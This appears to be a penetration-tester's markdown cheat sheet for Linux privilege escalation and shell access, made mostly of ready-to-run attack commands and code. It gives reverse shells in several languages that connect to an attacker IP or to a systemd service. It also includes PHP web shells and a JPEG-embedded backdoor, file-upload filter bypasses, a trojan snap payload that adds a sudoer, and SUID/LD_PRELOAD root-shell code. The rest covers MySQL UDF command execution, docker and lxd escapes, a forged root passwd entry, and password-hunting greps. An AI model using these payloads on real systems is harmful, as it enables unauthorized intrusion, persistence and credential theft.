### [Resources for Linux Privesc]
https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS

https://github.com/diego-treitos/linux-smart-enumeration

https://github.com/lucyoa/kernel-exploits

https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/

https://guide.offsecnewbie.com/privilege-escalation/linux-pe  

https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs  

### [Running your scripts]
```
chmod +x linpeas.sh
./linpeas > enumData.log

chmod +x ./lse.sh
./lse.sh -l2 >> enumData.log
```

### [Manual enumeration]
```
Enumerating linux OS
cat /etc/os-release

Who else logged in? 
who w last

Enumerating Kernel 
uname -a, env, whoami, history, pwd

Are you in sudoers file? 
sudo -l, cat /etc/sudoers

Other super users? grep -v -E "^#" /etc/passwd | awk -F: '$3 == 0 { print $1}'

Finding SUID binaries
find / -perm -u=s 2>/dev/null
find / -user root -perm -4000 -exec ls -ldb {} \; (From tryhackme labs)
find . -perm /4000

find links
find / -type l -ls 

sudo -l

Check for available shells
cat /etc/shells

Check crons
cat /etc/crontab

Checking logs for cron
grep "CRON" /var/log/cron.log

./shell -p

sudo strings /dev/sdb

ippsec has previously used the following commands:
find / -user <user> -readable 2>/dev/null
find / -user <user> -ls 2>/dev/null
find / -user <user> -ls 2>/dev/null | grep -v 'proc\|run\|sys'

Misc:

dpkg -l
lsmod
modinfo
```

### Searching for kernel exploits using searchsploit
```
searchsploit linux kernel <os_name> <version>
```

### groups access
https://book.hacktricks.xyz/linux-unix/privilege-escalation/interesting-groups-linux-pe

```
Group adm is used for system monitoring tasks. Members of this group can read many log files in /var/log, and can use xconsole. Historically, /var/log was /usr/adm (and later /var/adm), thus the name of the group.

Group lxd should be considered harmful in the same way the docker group is. Under no circumstances should a user in a local container be given access to the lxd group. This is because it’s entirely trivial to exploit.
```
https://reboare.github.io/lxd/lxd-escape.html

```
Users from the group shadow can read the /etc/shadow file

Group Disk privilege is almost equivalent to root access as you can access all the data inside of the machine.

Group Video, Using the command w you can find who is logged on the system.

Group Docker you can mount the root filesystem of the host machine to an instance’s volume, so when the instance starts it immediately loads a chroot into that volume. This effectively gives you root on the machine.
```

### Checking apache logs
`/var/log/apache2/*.log`  

### Processes:
ps aux
top  

### Enumeration Scripts
https://raw.githubusercontent.com/carlospolop/linux-privilege-escalation-awsome-script/master/linpeas.sh  
https://github.com/1N3/PrivEsc/tree/master/linux/scripts  

```
Enumeration of plaintext password  
grep -rnw '/' -ie 'pass' --color=always  
grep -rnw '/' -ie 'DB_PASS' --color=always  
grep -rnw '/' -ie 'DB_PASSWORD' --color=always  
grep -rnw '/' -ie 'DB_USER' --color=always  

Enumerating basics
grep -ra "password\|secret\|PRIVATE KEY" .
find . | grep "database*\|config*\|password*\|users*\|secret*\|db\|\.config"
```

### [Generating Public Keys and Xfering to your target]
```
1. ssh-keygen to create your paired keys (private + public)
2. cat your key.pub and copy and paste the public key data over to the host's authorized keys in /home/username/.ssh/authorized_keys
3. ssh into the box using your private key ssh -i privatekey username@IP
```

## [tty shell]
https://medium.com/bugbountywriteup/pimp-my-shell-5-ways-to-upgrade-a-netcat-shell-ecd551a180d2  
https://medium.com/bug-bounty-hunting/beginner-tips-to-own-boxes-at-hackthebox-9ae3fec92a96  

Example of a basic tty taken from https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/

### In reverse shell
`python -c 'import pty; pty.spawn("/bin/bash")'`  
`Ctrl-Z`  

### In Kali
`stty raw -echo`  
`fg`  

### In reverse shell
`reset`  
`export SHELL=bash`  
`export TERM=xterm-256color`  
`stty rows <num> columns <cols>`  

```
python -c 'import pty; pty.spawn("/bin/sh")'
python -c 'import pty; pty.spawn("/bin/bash")'
python2 -c 'import pty; pty.spawn("/bin/sh")'
python2 -c 'import pty; pty.spawn("/bin/bash")'
python3 -c 'import pty; pty.spawn("/bin/sh")'
python3 -c 'import pty; pty.spawn("/bin/bash")'
echo os.system('/bin/bash')
/bin/sh -i
perl —e 'exec "/bin/sh";'
perl: exec "/bin/sh";
ruby: exec "/bin/sh"
lua: os.execute('/bin/sh')
(From within IRB)
exec "/bin/sh"
(From within vi)
:!bash
(From within vi)
:set shell=/bin/bash:shell
(From within nmap)
!sh
```
### [Adding a user with root privileges into /etc/passwd]
```
Generate your hash by using openssl
openssl passwd -1 -salt [salt] [password]

Adding your entry
username:$1$new$hash:0:0:root:/root:/bin/bash
```

## [reverse TCP Shell's]

#### bash
```
bash -i >& /dev/tcp/10.0.0.1/8080 0>&1
```

### perl
```
perl -e 'use Socket;$i="10.0.0.1";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```

### python
```
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

### php
```
php -r '$sock=fsockopen("10.0.0.1",1234);exec("/bin/sh -i <&3 >&3 2>&3");'
```

### ruby
```
ruby -rsocket -e'f=TCPSocket.open("10.0.0.1",1234).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
```

### Netcat
```
nc -e /bin/sh 10.0.0.1 1234
```

### mkfifo
```
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 1234 >/tmp/f
```

### java
```
r = Runtime.getRuntime()
p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/10.0.0.1/2002;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
p.waitFor()
```
More information regarding reverse TCP:
http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet

### [SCP Transfer]
```
Local to Remote
scp file.txt username@IP:/remote/directory
scp -i private_key file.txt username@IP:/remote/directory
(Specify Port)
scp -P 2222 file username@IP:/remote/directory
scp -P port -r folder username@IP:/remote/directory


remote to local
scp remote_username@10.10.0.2:/remote/file.txt /local/directory
scp -r remote_username@10.10.0.2:/remote/folder /local/directory
scp -P port -r remote_username@10.10.0.2:/remote/file.txt /local/directory
scp -P port -r remote_username@10.10.0.2:/remote /local/directory
scp -i privatekey -r remote_username@10.10.0.2:/remote/folder /local/directory
```

### [Extracting Creds from mysql using mysqldump util]
```
Local
mysqldump -u mysql_username -ppassword Database_Name
mysqldump -u mysql_username -ppassword Database table_name

Remotely
mysqldump -h IP -P PORT -u mysql_username -ppassword Database_Name
mysqldump -h IP -P PORT -u mysql_username -ppassword Database_Name Table_Name
```

### [read and write files using mysql]
https://sqlwiki.netspi.com/attackQueries/readingAndWritingFiles/#mysql

### [Abusing PATH]
```
Abusing PATH allows you to trick a program into executing your payload instead of the intended program.

/usr/local/sbin/FILE
export PATH=/My/location/of/my/fake/FILE:$PATH

What's inside of FILE? FILE is actually a bash script that executes a payload
cat FILE
whoami

What you should see when the exploit works:
<escalated username> (root *hopefully)
```
More information regarding abusing PATH
https://www.hackingarticles.in/linux-privilege-escalation-using-path-variable/

### [Transferring files using netcat]
```
nc -l -p <port> > out.file

nc -w 3 <IP> 1234 < out.file
```
https://nakkaya.com/2009/04/15/using-netcat-for-file-transfers/

### [Exploiting lxd]
```
Creating your image:
git clone  https://github.com/saghul/lxd-alpine-builder.git
cd lxd-alpine-builder
./build-alpine

Importing your image:
lxc image import ./apline-image --alias myimage

Creating your resource pool and initializing your image:
lxd init
lxc init myimage ignite -c security.privileged=true
lxc config device add ignite mydevice disk source=/ path=/mnt/root recursive=true
lxc start ignite
lxc exec ignite /bin/sh

Navigation through mount:
cd /mnt/
cd /mnt/root
```
Resources on lxd

https://www.hackingarticles.in/lxd-privilege-escalation/

### [ssh through port 80]
```
sshpass -p tunneler ssh tunneler@10.10.10.10 -p 2222 -L 1234:10.174.12.14:80
curl http://127.0.0.1:1234
```

### [Hacking docker registry]
https://www.notsosecure.com/anatomy-of-a-hack-docker-registry/

### [Exploiting Elastic]
```
Bash Script:

elasticsploit.sh:
read -p 'Enter IP Address only: ' site
read -p 'Enter filename: ' filename

elasticdump \
  --input=http://$site:9200/endpoint \
  --output=$filename.json \
  --type=data
echo "-------------------------------------"
echo $filename".json has been dumped into the current directory"
```

### [OSCP Cheatsheet]
https://www.ired.team/offensive-security-experiments/offensive-security-cheetsheets


https://www.ired.team/offensive-security-experiments/offensive-security-cheetsheets#uploading-posting-files-through-www-upload-forms

#### POST file
curl -X POST -F "file=@/file/location/shell.php" http://$TARGET/upload.php --cookie "cookie"

### POST binary data to web form
curl -F "field=<shell.zip" http://$TARGET/upld.php -F 'k=v' --cookie "k=v;" -F "submit=true" -L -v

### PUTing File on the Webhost via PUT verb
curl -X PUT -d '<?php system($_GET["c"]);?>' http://$target/shell.php

### Injecting PHP into JPEG
```
exiv2 -c'A "<?php system($_REQUEST['cmd']);?>"!' backdoor.jpeg
exiftool “-comment<=back.php” back.png
```

### Bypassing File Upload Restrictions
```
file.php -> file.jpg
file.php -> file.php.jpg
file.asp -> file.asp;.jpg
file.gif (contains php code, but starts with string GIF/GIF98)
00%
file.jpg with php backdoor in exif (see below)
.jpg -> proxy intercept -> rename to .php
```
### Local File Inclusion to Shell
```
nc $target 80
GET /<?php passthru($_GET['cmd']); ?> HTTP/1.1
Host: $target
Connection: close
```

### [docker privilege escalation]
```
echo -e "FROM ubuntu:14.04\nENV WORKDIR /stuff\nRUN mkdir -p /stuff\nVOLUME [ /stuff ]\nWORKDIR /stuff" > Dockerfile && docker build -t my-docker-image . && docker run -v $PWD:/stuff -t my-docker-image /bin/sh -c 'cp /bin/sh /stuff && chown root.root /stuff/sh && chmod a+s /stuff/sh' && ./sh -c id && ./sh
```

### [php]
https://www.ired.team/offensive-security-experiments/offensive-security-cheetsheets#php-1
```
<?php file_put_contents("/var/tmp/shell.php", file_get_contents("http://10.11.0.245/shell.php")); ?>
```

### [searchsploit commands]
```
searchsploit <Service and/or version>

Creates a copy and sends it to your current directory
searchsploit -m script
```

### [exploiting bins]
https://gtfobins.github.io/gtfobins/vi/

### [privesc mongodb scheduler]
```
mongo -p -u <userid> scheduler

db.tasks.insert({"cmd":"/bin/cp /bin/bash /tmp/tom; /bin/chown <USERAME>:admin /tmp/hackedbash; chmodg+s /tmp/hackedbash; chmod u+s /tmp/hackedbash"});
```
### [Memcached]
https://www.hackingarticles.in/penetration-testing-on-memcached-server/

### [vim override]
```
vim file
:wq!
```

### [escape vim]
```
vim
:!/bin/bash
:!/bin/sh

vim
:set shell=/bin/bash
shell

vim
:set shell=/bin/sh
shell
```

### [escaping restricted shell (Thanks to Legacyy and bugbyt3)]
When you are in a restricted shell, try the following..  
press `CTL+V` then press `CTL+J`  
type `bash` and then press enter.  

### [Escaping rbash]
Firstly type `BASH_CMDS[a]=/bin/sh;a`  
You can then type the following two exports  
`export PATH=$PATH:/bin/` and `export PATH=$PATH:/usr/bin`

### [Restoring PATH]
```
export PATH=/usr/lib/lightdm/lightdm:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games
```

### [privesc /bin/systemctl] (To learn more about this privesc you can try the lab in tryhackme https://tryhackme.com/room/vulnversity, this was a great experience)
```
1. Create a service unit file within a directory such as /dev/shm

root.service

[Unit]
Description=xxx

[Service]
Type=Simple
User=root
ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/LHOST/LPORT 0>&1'

[Install]
WantedBy=multi-user.target

2. Configure your service unit file using systemctl

/bin/systemctl enable /dev/shm/root.service

3. Executing your payload

/bin/systemctl start root
```

### [restricted shell bypassing]
https://www.exploit-db.com/docs/english/44592-linux-restricted-shell-bypass-guide.pdf

### [exploiting sudo 1.8.27]
https://www.exploit-db.com/exploits/47502

```
things to look for in sudo -l
(ALL, !root) /bin/bash

sudo -u#-1 /bin/bash
```

### [Escaping Docker Container]
https://medium.com/better-programming/escaping-docker-privileged-containers-a7ae7d17f5a1

### [Creating a LD_PRELOAD and suid bin]

```
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
void _init() {
	unsetenv("LD_PRELOAD");
	setgid(0);
	setuid(0);
	system("/bin/sh");
}



print 'int main(void){\nsetresuid(0, 0, 0);\nsystem("/bin/sh");\n}' > /tmp/suid.c   
gcc -o /tmp/suid /tmp/suid.c  
sudo chmod +x /tmp/suid
sudo chmod +s /tmp/suid
```

### [Sudo inject]

https://github.com/nongiach/sudo_inject

### [Uploading an SSH key using snap Thanks to @iiLegacyii]

This code was taken from https://www.exploit-db.com/exploits/46362

```python
TROJAN_SNAP = ('''                                                                                            
aHNxcwcAAAAQIVZcAAACAAAAAAAEABEA0AIBAAQAAADgAAAAAAAAAI4DAAAAAAAAhgMAAAAAAAD/                                  
/////////xICAAAAAAAAsAIAAAAAAAA+AwAAAAAAAHgDAAAAAAAAIyEvYmluL2Jhc2gKCnVzZXJh                                  
ZGQgZGlydHlfc29jayAtbSAtcCAnJDYkc1daY1cxdDI1cGZVZEJ1WCRqV2pFWlFGMnpGU2Z5R3k5                                  
TGJ2RzN2Rnp6SFJqWGZCWUswU09HZk1EMXNMeWFTOTdBd25KVXM3Z0RDWS5mZzE5TnMzSndSZERo                                  
T2NFbURwQlZsRjltLicgLXMgL2Jpbi9iYXNoCnVzZXJtb2QgLWFHIHN1ZG8gZGlydHlfc29jawpl                                  
Y2hvICJkaXJ0eV9zb2NrICAgIEFMTD0oQUxMOkFMTCkgQUxMIiA+PiAvZXRjL3N1ZG9lcnMKbmFt                                  
ZTogZGlydHktc29jawp2ZXJzaW9uOiAnMC4xJwpzdW1tYXJ5OiBFbXB0eSBzbmFwLCB1c2VkIGZv                                  
ciBleHBsb2l0CmRlc2NyaXB0aW9uOiAnU2VlIGh0dHBzOi8vZ2l0aHViLmNvbS9pbml0c3RyaW5n                                  
L2RpcnR5X3NvY2sKCiAgJwphcmNoaXRlY3R1cmVzOgotIGFtZDY0CmNvbmZpbmVtZW50OiBkZXZt                                  
b2RlCmdyYWRlOiBkZXZlbAqcAP03elhaAAABaSLeNgPAZIACIQECAAAAADopyIngAP8AXF0ABIAe                                  
rFoU8J/e5+qumvhFkbY5Pr4ba1mk4+lgZFHaUvoa1O5k6KmvF3FqfKH62aluxOVeNQ7Z00lddaUj                                  
rkpxz0ET/XVLOZmGVXmojv/IHq2fZcc/VQCcVtsco6gAw76gWAABeIACAAAAaCPLPz4wDYsCAAAA                                  
AAFZWowA/Td6WFoAAAFpIt42A8BTnQEhAQIAAAAAvhLn0OAAnABLXQAAan87Em73BrVRGmIBM8q2
XR9JLRjNEyz6lNkCjEjKrZZFBdDja9cJJGw1F0vtkyjZecTuAfMJX82806GjaLtEv4x1DNYWJ5N5                                  
RQAAAEDvGfMAAWedAQAAAPtvjkc+MA2LAgAAAAABWVo4gIAAAAAAAAAAPAAAAAAAAAAAAAAAAAAA                                  
AFwAAAAAAAAAwAAAAAAAAACgAAAAAAAAAOAAAAAAAAAAPgMAAAAAAAAEgAAAAACAAw'''                                         
               + 'A' * 4256 + '==')  

f = open("snap.snap", "w")
f.write(TROJAN_SNAP)
f.close()
```

snap.snap must then be base64 decoded

`cat snap.snap | base64 -d > decoded_snap.snap`

upload the decoded_snap.snap onto the remote target

privilege escalate by using `sudo snap install decoded_snap.snap --devmode`

### sudo 1.8.0 < 1.8.3p1 privesc  
https://www.exploit-db.com/exploits/25134

### mysql user defined function dynamic library

The UDF Exploit below was taken from the following link:
https://www.exploit-db.com/exploits/1518

1. Compiling the source code

```
gcc -g -c x.c
gcc -g -shared -Wl,-soname,x.so -o x.so x.o -lc
```

2. mysql commands to create your function and execute commands

```
mysql -u root -p
insert into foo values(load_file('/dev/shm/x.so'));
select * from foo into dumpfile '/usr/lib/x.so';
create function do_system returns integer soname 'x.so';
select * from mysql.func;
select do_system('id > /tmp/x; chown <username>.<username> /tmp/x');
select do_system('bash -c "bash -i >& /dev/tcp/<ip>/<port> 0>&1"');
```

UDF Source code

```c
#include <stdio.h>
#include <stdlib.h>

enum Item_result {STRING_RESULT, REAL_RESULT, INT_RESULT, ROW_RESULT};

typedef struct st_udf_args {
	unsigned int		arg_count;	// number of arguments
	enum Item_result	*arg_type;	// pointer to item_result
	char 			**args;		// pointer to arguments
	unsigned long		*lengths;	// length of string args
	char			*maybe_null;	// 1 for maybe_null args
} UDF_ARGS;

typedef struct st_udf_init {
	char			maybe_null;	// 1 if func can return NULL
	unsigned int		decimals;	// for real functions
	unsigned long 		max_length;	// for string functions
	char			*ptr;		// free ptr for func data
	char			const_item;	// 0 if result is constant
} UDF_INIT;

int do_system(UDF_INIT *initid, UDF_ARGS *args, char *is_null, char *error)
{
	if (args->arg_count != 1)
		return(0);

	system(args->args[0]);

	return(0);
}

char do_system_init(UDF_INIT *initid, UDF_ARGS *args, char *message)
{
	return(0);
}
```

### nmap privilege escalation

```
nmap --interactive
!sh
```
